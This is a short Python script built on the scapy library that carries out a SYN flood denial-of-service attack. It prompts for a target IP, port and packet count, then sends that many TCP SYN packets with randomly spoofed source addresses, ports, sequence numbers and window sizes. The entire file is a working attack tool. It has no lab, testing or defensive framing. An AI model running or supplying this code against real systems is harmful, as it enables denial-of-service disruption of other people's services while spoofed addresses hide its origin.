from scapy.all import *
import os
import sys
import random


def randomIP():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def randInt():
    x = random.randint(1000, 9000)
    return x	


def syn_flood(dstIP, dstPort, counter):
    total = 0
    print("Packets are sending...")
    for x in range(0, counter):
        s_port = randInt()
        s_eq = randInt()
        w_indow = randInt()

        IP_Packet = IP ()
        IP_Packet.src = randomIP()
        IP_Packet.dst = dstIP

        TCP_Packet = TCP ()	
        TCP_Packet.sport = s_port
        TCP_Packet.dport = dstPort
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow
        send(IP_Packet/TCP_Packet, verbose=0)
        total += 1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


def main():
    ip = input("Target IP: ")
    port = input("Target Port: ")
    counter = input ("How many packets do you want to send : ")
    syn_flood(ip, int(port), int(counter))


if __name__ == "__main__":
    main()